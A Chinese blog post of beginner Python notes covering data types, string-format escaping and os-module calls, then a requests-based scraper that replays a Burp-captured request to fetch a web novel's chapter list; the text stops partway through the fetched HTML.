<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Python | arkcimi's Blog</title><meta name="author" content="arkcimi"><meta name="copyright" content="arkcimi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Python数组(补一下python的知识) tuple 1(a, b, c......)  list 1[a, b, c......]  dict 1&amp;#123;a:aa, b:bb, c:cc......&amp;#125;  str123456&quot;\&quot;\&quot;&quot; # &#x3D;&gt; &quot;&quot;&quot;\\\\&quot; # &#x3D;&gt; \\&amp;quot">
<meta property="og:type" content="article">
<meta property="og:title" content="Python">
<meta property="og:url" content="http://example.com/Python/index.html">
<meta property="og:site_name" content="arkcimi&#39;s Blog">
<meta property="og:description" content="Python数组(补一下python的知识) tuple 1(a, b, c......)  list 1[a, b, c......]  dict 1&amp;#123;a:aa, b:bb, c:cc......&amp;#125;  str123456&quot;\&quot;\&quot;&quot; # &#x3D;&gt; &quot;&quot;&quot;\\\\&quot; # &#x3D;&gt; \\&amp;quot">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/head.jpg">
<meta property="article:published_time" content="2023-12-07T15:05:36.000Z">
<meta property="article:modified_time" content="2024-05-21T01:54:42.847Z">
<meta property="article:author" content="arkcimi">
<meta property="article:tag" content="python">
<meta property="article:tag" content="web">
<meta property="article:tag" content="ssti">
<meta property="article:tag" content="flask">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/head.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/Python/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Python',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-21 09:54:42'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="arkcimi's Blog"><span class="site-name">arkcimi's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Python</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-07T15:05:36.000Z" title="发表于 2023-12-07 23:05:36">2023-12-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-21T01:54:42.847Z" title="更新于 2024-05-21 09:54:42">2024-05-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Code/">Code</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Python"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>(补一下python的知识)</p>
<p>tuple</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a, b, c......)</span><br></pre></td></tr></table></figure>

<p>list</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a, b, c......]</span><br></pre></td></tr></table></figure>

<p>dict</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;a:aa, b:bb, c:cc......&#125;</span><br></pre></td></tr></table></figure>

<h2 id="str"><a href="#str" class="headerlink" title="str"></a>str</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\&quot;\&quot;&quot;</span> <span class="comment"># =&gt; &quot;&quot;</span></span><br><span class="line"><span class="string">&quot;\\\\&quot;</span> <span class="comment"># =&gt; \\</span></span><br><span class="line"><span class="string">&quot;&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span> <span class="comment"># =&gt; &#123;&#123;&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>) <span class="comment"># =&gt; &#123;2&#125;</span></span><br><span class="line"><span class="string">&quot;&#123;&#123;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>) <span class="comment"># =&gt; &#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>) <span class="comment"># =&gt; 2</span></span><br></pre></td></tr></table></figure>

<h2 id="os"><a href="#os" class="headerlink" title="os"></a>os</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52007481/article/details/126918076?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170236996816800184174780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170236996816800184174780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-126918076-null-null.142%5Ev96%5Epc_search_result_base3&utm_term=python%20os&spm=1018.2226.3001.4187">os</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
<p>可以运行系统命令</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(os.popen(<span class="string">&#x27;ls /&#x27;</span>).read())</span><br><span class="line"><span class="built_in">bin</span></span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">......</span><br><span class="line">www_30765</span><br><span class="line">www_9050</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getcwd()                 <span class="comment"># 获取当前工作路径</span></span><br><span class="line"><span class="string">&#x27;/home/arkcimi&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.getlogin()               <span class="comment"># 获取登录信息</span></span><br><span class="line"><span class="string">&#x27;arkcimi&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.name</span><br><span class="line"><span class="string">&#x27;posix&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.environ</span><br><span class="line">&#123;环境变量&#125;</span><br></pre></td></tr></table></figure>

<h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><p>随便找个小说试一下</p>
<p><a target="_blank" rel="noopener" href="https://www.biqukan8.cc/38_38964/20392684.html">剑来</a></p>
<p>用burp抓包</p>
<p>章节目录</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="operator">/</span><span class="number">38</span>_38964<span class="operator">/</span><span class="number">20392684.</span>html HTTP<span class="operator">/</span><span class="number">2</span></span><br><span class="line">Host<span class="operator">:</span> www.biqukan8.cc</span><br><span class="line">Cookie<span class="operator">:</span> __51cke__<span class="operator">=</span>; bcolor<span class="operator">=</span>; font<span class="operator">=</span>; size<span class="operator">=</span>; fontcolor<span class="operator">=</span>; width<span class="operator">=</span>; __tins__21819133<span class="operator">=</span><span class="operator">%7B%</span><span class="number">22</span>sid<span class="operator">%22%</span><span class="number">3</span>A<span class="operator">%201701961220502%</span><span class="number">2</span>C<span class="operator">%20%</span><span class="number">22</span>vd<span class="operator">%22%</span><span class="number">3</span>A<span class="operator">%203%</span><span class="number">2</span>C<span class="operator">%20%</span><span class="number">22</span>expires<span class="operator">%22%</span><span class="number">3</span>A<span class="operator">%201701963144795%</span><span class="number">7</span>D; __51laig__<span class="operator">=</span><span class="number">3</span></span><br><span class="line">Cache<span class="operator">-</span>Control<span class="operator">:</span> <span class="built_in">max</span><span class="operator">-</span>age<span class="operator">=</span><span class="number">0</span></span><br><span class="line">Sec<span class="operator">-</span>Ch<span class="operator">-</span>Ua<span class="operator">:</span> <span class="string">&quot;Chromium&quot;</span>;v<span class="operator">=</span><span class="string">&quot;119&quot;</span><span class="punctuation">,</span> <span class="string">&quot;Not?A_Brand&quot;</span>;v<span class="operator">=</span><span class="string">&quot;24&quot;</span></span><br><span class="line">Sec<span class="operator">-</span>Ch<span class="operator">-</span>Ua<span class="operator">-</span>Mobile<span class="operator">:</span> <span class="operator">?</span><span class="number">0</span></span><br><span class="line">Sec<span class="operator">-</span>Ch<span class="operator">-</span>Ua<span class="operator">-</span>Platform<span class="operator">:</span> <span class="string">&quot;Linux&quot;</span></span><br><span class="line">Upgrade<span class="operator">-</span>Insecure<span class="operator">-</span>Requests<span class="operator">:</span> <span class="number">1</span></span><br><span class="line">User<span class="operator">-</span>Agent<span class="operator">:</span> Mozilla<span class="operator">/</span><span class="number">5.0</span> <span class="punctuation">(</span>Windows NT <span class="number">10.0</span>; Win64; x64<span class="punctuation">)</span> AppleWebKit<span class="operator">/</span><span class="number">537.36</span> <span class="punctuation">(</span>KHTML<span class="punctuation">,</span> like Gecko<span class="punctuation">)</span> Chrome<span class="operator">/</span><span class="number">119.0</span>.6045.123 Safari<span class="operator">/</span><span class="number">537.36</span></span><br><span class="line">Accept<span class="operator">:</span> text<span class="operator">/</span>html<span class="punctuation">,</span>application<span class="operator">/</span>xhtml<span class="operator">+</span>xml<span class="punctuation">,</span>application<span class="operator">/</span>xml;q<span class="operator">=</span><span class="number">0.9</span><span class="punctuation">,</span>image<span class="operator">/</span>avif<span class="punctuation">,</span>image<span class="operator">/</span>webp<span class="punctuation">,</span>image<span class="operator">/</span>apng<span class="punctuation">,</span><span class="operator">*</span><span class="operator">/</span><span class="operator">*</span>;q<span class="operator">=</span><span class="number">0.8</span><span class="punctuation">,</span>application<span class="operator">/</span>signed<span class="operator">-</span>exchange;v<span class="operator">=</span>b3;q<span class="operator">=</span><span class="number">0.7</span></span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>Site<span class="operator">:</span> none</span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>Mode<span class="operator">:</span> navigate</span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>User<span class="operator">:</span> <span class="operator">?</span><span class="number">1</span></span><br><span class="line">Sec<span class="operator">-</span>Fetch<span class="operator">-</span>Dest<span class="operator">:</span> document</span><br><span class="line">Accept<span class="operator">-</span>Encoding<span class="operator">:</span> gzip<span class="punctuation">,</span> deflate<span class="punctuation">,</span> br</span><br><span class="line">Accept<span class="operator">-</span>Language<span class="operator">:</span> en<span class="operator">-</span>US<span class="punctuation">,</span>en;q<span class="operator">=</span><span class="number">0.9</span></span><br><span class="line">If<span class="operator">-</span>None<span class="operator">-</span>Match<span class="operator">:</span> <span class="string">&quot;1701957784_br&quot;</span></span><br><span class="line">If<span class="operator">-</span>Modified<span class="operator">-</span>Since<span class="operator">:</span> Thu<span class="punctuation">,</span> <span class="number">07</span> Dec <span class="number">2023</span> <span class="number">14</span><span class="operator">:</span><span class="number">03</span><span class="operator">:</span><span class="number">04</span> GMT</span><br><span class="line">Priority<span class="operator">:</span> u<span class="operator">=</span><span class="number">0</span><span class="punctuation">,</span> i</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>python中的 <strong>requests</strong> 库可以发送requests请求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.biqukan8.cc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span></span><br><span class="line">&#125;                       <span class="comment"># Cookie一般是用来认证身份</span></span><br><span class="line"></span><br><span class="line">main_url = <span class="string">&quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;</span></span><br><span class="line"></span><br><span class="line">main_resp = requests.get(main_url, headers=headers)  <span class="comment"># 用get发送请求</span></span><br><span class="line"></span><br><span class="line">main_text = main_resp.text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(main_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行命令 </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python [filename].py</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span>login();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span> <span class="attr">title</span>=<span class="string">&quot;笔趣阁&quot;</span>&gt;</span>笔趣阁<span class="tag">&lt;<span class="name">em</span>&gt;</span>www.biqukan8.cc<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                 <span class="tag">&lt;<span class="name">script</span>&gt;</span>search();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/modules/article/bookcase.php&quot;</span>&gt;</span>我的书架<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span>list1();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;book&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>剑来<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">script</span>&gt;</span>app2();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span>list2();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;listmain&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dt</span>&gt;</span>《剑来》最新章节列表<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/51894719.html&quot;</span>&gt;</span>第一千一百四十章 这天公<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/51951192.html&quot;</span>&gt;</span>第一千一百三十九章 故事是一把双刃剑<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52004020.html&quot;</span>&gt;</span>第一千一百三十八章 蜉蝣见青天<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52014535.html&quot;</span>&gt;</span>第一千一百三十七章 如书如句读<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52076294.html&quot;</span>&gt;</span>第一千一百三十六章 人各梦魂中<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52108078.html&quot;</span>&gt;</span>第一千一百三十五章 再见陈平安<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52141526.html&quot;</span>&gt;</span>第一千一百三十四章 都曾少年游<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52280452.html&quot;</span>&gt;</span>第一千一百三十三章 道上青天<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52317327.html&quot;</span>&gt;</span>第一千一百三十二章 为何就山，可问春风<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> =<span class="string">&quot;/38_38964/52337099.html&quot;</span>&gt;</span>第一千一百三十一章 三三得几<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span 